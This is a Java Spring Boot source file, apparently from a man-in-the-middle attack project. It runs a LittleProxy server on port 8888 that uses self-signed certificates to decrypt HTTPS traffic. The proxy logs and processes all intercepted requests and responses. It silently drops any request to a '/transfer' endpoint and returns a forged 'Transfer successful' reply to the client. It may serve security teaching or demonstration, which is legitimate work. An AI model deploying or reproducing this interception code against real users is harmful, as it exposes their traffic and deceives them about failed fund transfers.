package com.mim.attacker.config;

import com.mim.attacker.service.InterceptorService;
import com.mim.attacker.service.LoggingService;
import com.mim.attacker.util.DataManipulator;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;
import org.littleshoot.proxy.HttpFilters;
import org.littleshoot.proxy.HttpFiltersAdapter;
import org.littleshoot.proxy.HttpFiltersSourceAdapter;
import org.littleshoot.proxy.HttpProxyServerBootstrap;
import org.littleshoot.proxy.impl.DefaultHttpProxyServer;
import org.littleshoot.proxy.extras.SelfSignedMitmManager;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.CommandLineRunner;
import org.springframework.stereotype.Component;

import io.netty.channel.ChannelHandlerContext;

import java.net.URI;
import java.net.http.HttpClient;
import java.util.stream.Collectors;

@Component
public class ProxyServerComponent implements CommandLineRunner {
    private final InterceptorService requestInterceptorService;
    private static final Logger log = LoggerFactory.getLogger(ProxyServerComponent.class);
    private final LoggingService loggingService;

    private final HttpClient httpClient;

    public ProxyServerComponent(InterceptorService requestInterceptorService, LoggingService loggingService){
        this.requestInterceptorService = requestInterceptorService;
        this.loggingService = loggingService;
        this.httpClient = HttpClient.newHttpClient();
    }

    @Override
    public void run(String... args) throws Exception {
        log.info("Starting the MIM proxy server on port 8888...");
        HttpProxyServerBootstrap bootstrap = DefaultHttpProxyServer.bootstrap();
        bootstrap.withPort(8888)  // Port on which the proxy server will run
                .withManInTheMiddle(new SelfSignedMitmManager())  // Enable MITM to intercept and modify HTTPS traffic
                .withFiltersSource(new HttpFiltersSourceAdapter() {  // Set up request and response filters

                    @Override
                    public int getMaximumRequestBufferSizeInBytes() {
                        return 10 * 1024 * 1024; // Increase buffer size if needed
                    }

                    @Override
                    public int getMaximumResponseBufferSizeInBytes() {
                        return 10 * 1024 * 1024; // Increase buffer size if needed
                    }
                    @Override
                    public HttpFilters filterRequest(HttpRequest originalRequest, ChannelHandlerContext ctx) {
                        return new HttpFiltersAdapter(originalRequest) {
                            @Override
                            public HttpResponse clientToProxyRequest(HttpObject httpObject) {
                                // Modify the request here as needed
                                if (httpObject instanceof FullHttpRequest fullRequest) {
                                    String uri = fullRequest.uri();
                                    log.info("Intercepting request "+ uri);
                                    requestInterceptorService.processRequest(fullRequest);
                                    // requestInterceptorService.processRequestAsJSON(fullRequest);
                                    // If endpoint is related to fund transfer then halt the response
                                    if (uri.contains("/transfer"))
                                        return createResponseToHaltFurtherProcessing();
                                }
                                return null;
                            }

                            @Override
                            public HttpObject serverToProxyResponse(HttpObject httpObject) {
                                // Modify the response here as needed
                                log.info("Intercepting response");
                                if (httpObject instanceof HttpResponse) {
                                    requestInterceptorService.processResponse((HttpResponse) httpObject);
                                    // requestInterceptorService.processResponseAsJSON((HttpResponse) httpObject);
                                }
                                return httpObject;
                            }
                        };
                    }
                })
                .start();  // Start the proxy server
    }

    private HttpResponse createResponseToHaltFurtherProcessing() {
        // Message to be included in the response body
        String message = "Transfer successful";
        ByteBuf content = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);

        // Create a response that indicates the request has been fully handled
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, content);

        // Set headers to reflect the presence of a body
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, content.readableBytes());

        return response; // This tells the proxy to not forward the request further.
    }


}
